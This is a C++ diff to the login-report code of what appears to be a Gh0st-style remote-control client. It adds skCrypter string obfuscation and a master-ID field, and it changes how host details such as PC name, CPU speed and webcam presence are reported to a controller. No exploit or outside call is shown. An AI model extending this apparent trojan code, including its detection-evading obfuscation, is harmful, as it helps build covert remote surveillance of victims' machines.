@@ -6,6 +6,7 @@
 #include <iomanip>
 #include <ctime>
 #include <NTSecAPI.h>
+#include "common/skCrypter.h"
 
 // by ChatGPT
 bool IsWindows11() {
@@ -44,7 +45,7 @@ std::string getSystemName()
 	}
 	if (IsWindows11()) {
 		vname = "Windows 11";
-		printf_s("此电脑的版本为:%s\n", vname.c_str());
+		Mprintf("此电脑的版本为:%s\n", vname.c_str());
 		return vname;
 	}
 	DWORD dwMajor, dwMinor, dwBuildNumber;
@@ -57,13 +58,13 @@ std::string getSystemName()
 	if (dwMajor == 6 && dwMinor == 3)	//win 8.1
 	{
 		vname = "Windows 8.1";
-		printf_s("此电脑的版本为:%s\n", vname.c_str());
+		Mprintf("此电脑的版本为:%s\n", vname.c_str());
 		return vname;
 	}
 	if (dwMajor == 10 && dwMinor == 0)	//win 10
 	{
 		vname = "Windows 10";
-		printf_s("此电脑的版本为:%s\n", vname.c_str());
+		Mprintf("此电脑的版本为:%s\n", vname.c_str());
 		return vname;
 	}
 	//下面不能判断Win Server，因为本人还未有这种系统的机子，暂时不给出
@@ -141,10 +142,10 @@ std::string getSystemName()
 		default:
 			vname = "未知操作系统";
 		}
-		printf_s("此电脑的版本为:%s\n", vname.c_str());
+		Mprintf("此电脑的版本为:%s\n", vname.c_str());
 	}
 	else
-		printf_s("版本获取失败\n");
+		Mprintf("版本获取失败\n");
 	return vname;
 }
 
@@ -178,7 +179,7 @@ std::string getProcessTime() {
 	return buffer;
 }
 
-LOGIN_INFOR GetLoginInfo(DWORD dwSpeed, int nType)
+LOGIN_INFOR GetLoginInfo(DWORD dwSpeed, const CONNECT_ADDRESS& conn)
 {
 	LOGIN_INFOR  LoginInfor;
 	LoginInfor.bToken = TOKEN_LOGIN; // 令牌为登录
@@ -194,12 +195,17 @@ LOGIN_INFOR GetLoginInfo(DWORD dwSpeed, int nType)
 
 	BOOL bWebCamIsExist = WebCamIsExist();
 
-	memcpy(LoginInfor.szPCName,szPCName,MAX_PATH);
+	memcpy(LoginInfor.szPCName,szPCName,sizeof(LoginInfor.szPCName));
 	LoginInfor.dwSpeed  = dwSpeed;
 	LoginInfor.dwCPUMHz = dwCPUMHz;
 	LoginInfor.bWebCamIsExist = bWebCamIsExist;
 	strcpy_s(LoginInfor.szStartTime, getProcessTime().c_str());
-	sprintf_s(LoginInfor.szReserved, "%s", GetClientType(nType));
+	sprintf_s(LoginInfor.szReserved, "%s", GetClientType(conn.ClientType()));
+	bool isDefault = strlen(conn.szFlag) == 0 || strcmp(conn.szFlag, skCrypt(FLAG_GHOST)) == 0 ||
+		strcmp(conn.szFlag, skCrypt("Happy New Year!")) == 0;
+	std::string masterHash(skCrypt(MASTER_HASH));
+	const char* id = isDefault ? masterHash.c_str() : conn.szFlag;
+	memcpy(LoginInfor.szMasterID, id, min(strlen(id), 16));
 
 	return LoginInfor;
 }
